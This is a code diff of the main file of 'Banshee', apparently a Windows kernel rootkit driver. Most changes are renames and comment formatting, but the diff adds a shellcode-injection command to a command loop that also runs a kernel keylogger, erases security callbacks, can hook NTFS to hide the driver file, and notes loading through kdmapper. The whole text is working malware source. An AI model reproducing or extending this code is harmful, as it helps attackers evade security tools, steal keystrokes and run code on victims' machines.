@@ -10,7 +10,7 @@
 // --------------------------------------------------------------------------------------------------------
 
 // Features
-
+//
 // Deny file system  access to the banshee.sys file by hooking NTFS
 #define DENY_DRIVER_FILE_ACCESS FALSE
 
@@ -29,8 +29,8 @@ BeUnload()
 {
     LOG_MSG("Unload Called \r\n");
 
-    BeGlobals::shutdown = true;
-    BeGlobals::logKeys = false;
+    BeGlobals::Shutdown = true;
+    BeGlobals::LogKeys = false;
 
     KeWaitForSingleObject(&BeGlobals::hKeyLoggerTerminationEvent, Executive, KernelMode, FALSE, NULL);
     KeWaitForSingleObject(&BeGlobals::hMainLoopTerminationEvent, Executive, KernelMode, FALSE, NULL);
@@ -42,14 +42,14 @@ BeUnload()
     // Restore kernel callbacks
     {
         {
-            AutoLock<FastMutex> _lock(BeGlobals::callbackLock);
+            AutoLock<FastMutex> _lock(BeGlobals::CallbackLock);
 
-            LOG_MSG("Erased kernel callback amount: %i\n", BeGlobals::beCallbacksToRestore.length);
-            while (BeGlobals::beCallbacksToRestore.length >= 0)
+            LOG_MSG("Erased kernel callback amount: %i\n", BeGlobals::BeCallbacksToRestore.length);
+            while (BeGlobals::BeCallbacksToRestore.length >= 0)
             {
-                auto callbackToRestore = BeGlobals::beCallbacksToRestore.callbackToRestore[BeGlobals::beCallbacksToRestore.length];
-                auto callbackAddr = BeGlobals::beCallbacksToRestore.addrOfCallbackFunction[BeGlobals::beCallbacksToRestore.length];
-                auto callbackType = BeGlobals::beCallbacksToRestore.callbackType[BeGlobals::beCallbacksToRestore.length];
+                auto callbackToRestore = BeGlobals::BeCallbacksToRestore.callbackToRestore[BeGlobals::BeCallbacksToRestore.length];
+                auto callbackAddr = BeGlobals::BeCallbacksToRestore.addrOfCallbackFunction[BeGlobals::BeCallbacksToRestore.length];
+                auto callbackType = BeGlobals::BeCallbacksToRestore.callbackType[BeGlobals::BeCallbacksToRestore.length];
 
                 if (callbackToRestore != NULL)
                 {
@@ -65,14 +65,14 @@ BeUnload()
                         break;
                     }
                 }
-                BeGlobals::beCallbacksToRestore.length--;
+                BeGlobals::BeCallbacksToRestore.length--;
             }
         }
     }
 
     // Unhook if NTFS was hooked
 #if DENY_DRIVER_FILE_ACCESS
-    if (BeGlobals::originalNTFS_IRP_MJ_CREATE_function != NULL)
+    if (BeGlobals::OriginalNTFS_IRP_MJ_CREATE_function != NULL)
     {
         if (BeUnhookNTFSFileCreate() == STATUS_SUCCESS)
         {
@@ -107,23 +107,29 @@ BeMainLoop(PVOID StartContext)
 
     KAPC_STATE apc;
 
-    while (!BeGlobals::shutdown)
+    while (!BeGlobals::Shutdown)
     {
         LOG_MSG("Waiting for commandEvent...\n");
         NTSTATUS status = BeWaitForEvent(BeGlobals::commandEvent);
         LOG_MSG("CommandEvent Signaled! %d\n", status);
 
+        //
         // Reset
+        //
         status = BeSetNamedEvent(BeGlobals::commandEvent, FALSE);
         LOG_MSG("CommandEvent reset! %d\n", status);
 
+        //
         // Read command payload
+        //
         KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
         BANSHEE_PAYLOAD payload = *(BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory;
         LOG_MSG("Read: %d\n", payload.cmdType);
         KeUnstackDetachProcess(&apc);
-
+        
+        //
         // Execute command
+        //
         NTSTATUS bansheeStatus = STATUS_NOT_IMPLEMENTED;
         switch (payload.cmdType)
         {
@@ -143,16 +149,22 @@ BeMainLoop(PVOID StartContext)
             {
                 auto cbData = BeCmd_EnumerateCallbacks((CALLBACK_TYPE)payload.ulValue);
 
+                //
                 // Write answer: copy over callbacks
+                //
                 KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
                 for (auto i = 0U; i < cbData.size(); ++i)
                 {
                     memcpy((PVOID)&(*((BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory)).callbackData[i], (PVOID)&cbData[i], sizeof(CALLBACK_DATA));
                 }
+                
+                //
                 // Write amount of callbacks to ulValue
+                //
                 (*((BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory)).ulValue = (ULONG)cbData.size();
                 KeUnstackDetachProcess(&apc);
             }
+
             bansheeStatus = STATUS_SUCCESS;
             break;
         case ERASE_CALLBACKS:
@@ -160,6 +172,9 @@ BeMainLoop(PVOID StartContext)
             break;
         case START_KEYLOGGER:
             bansheeStatus = BeCmd_StartKeylogger((BOOLEAN)payload.byteValue);
+            break;
+        case INJECTION:
+            bansheeStatus = BeCmd_InjectionShellcode(payload.ulValue, payload.wcharString);
             break;
         case UNLOAD:
             BeSetNamedEvent(BeGlobals::answerEvent, TRUE);
@@ -170,12 +185,16 @@ BeMainLoop(PVOID StartContext)
             break;
         }
 
+        //
         // Write answer
+        //
         KeStackAttachProcess(BeGlobals::winLogonProc, &apc);
         (*((BANSHEE_PAYLOAD*)BeGlobals::pSharedMemory)).status = bansheeStatus;
         KeUnstackDetachProcess(&apc);
 
+        //
         // Set answer event
+        //
         BeSetNamedEvent(BeGlobals::answerEvent, TRUE);
         LOG_MSG("Set answerEvent\n");
     }
@@ -192,8 +211,10 @@ BeMainLoop(PVOID StartContext)
  * @return NTSTATUS status code.
  */
 NTSTATUS
-BansheeEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
-{
+BansheeEntry(
+    _In_ PDRIVER_OBJECT  pDriverObject, 
+    _In_ PUNICODE_STRING pRegistryPath
+){
     UNREFERENCED_PARAMETER(pRegistryPath);
     UNREFERENCED_PARAMETER(pDriverObject);
 
@@ -210,18 +231,22 @@ BansheeEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
         return NtStatus;
     }
 
+    //
     // Start Keylogger Thread
+    //
     NtStatus = PsCreateSystemThread(&hKeyloggerThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, BeKeyLoggerFunction, NULL);
     if (NtStatus != 0)
     {
         return NtStatus;
     }
 
+    //
     // Main command loop
+    //
     NtStatus = PsCreateSystemThread(&hMainLoop, THREAD_ALL_ACCESS, NULL, NULL, NULL, BeMainLoop, NULL);
     if (NtStatus != 0)
     {
-        BeGlobals::logKeys = false;
+        BeGlobals::LogKeys = false;
         ZwClose(hKeyloggerThread);
         return NtStatus;
     }
@@ -236,17 +261,21 @@ BansheeEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
  * @param pRegistryPath A pointer to a UNICODE_STRING structure that specifies the path to the driver's Parameters key in the registry.
  * @return NTSTATUS status code.
  */
-extern "C"
+EXTERN_C
 NTSTATUS
-DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
-{
+DriverEntry(
+    _In_ PDRIVER_OBJECT  pDriverObject,
+    _In_ PUNICODE_STRING pRegistryPath
+) {
     LOG_MSG(" ______   ______   ______   ______   _    _   ______  ______ \n");
     LOG_MSG("| |  | \\ | |  | | | |  \\ \\ / |      | |  | | | |     | |     \n");
     LOG_MSG("| |--| < | |__| | | |  | | '------. | |--| | | |---- | |---- \n");
     LOG_MSG("|_|__|_/ |_|  |_| |_|  |_|  ____|_/ |_|  |_| |_|____ |_|____ \n");
     LOG_MSG(BANSHEE_VERSION);
 
+    //
     // If mapped, e.g. with kdmapper, those are empty.
+    //
     UNREFERENCED_PARAMETER(pDriverObject);
     UNREFERENCED_PARAMETER(pRegistryPath);
 
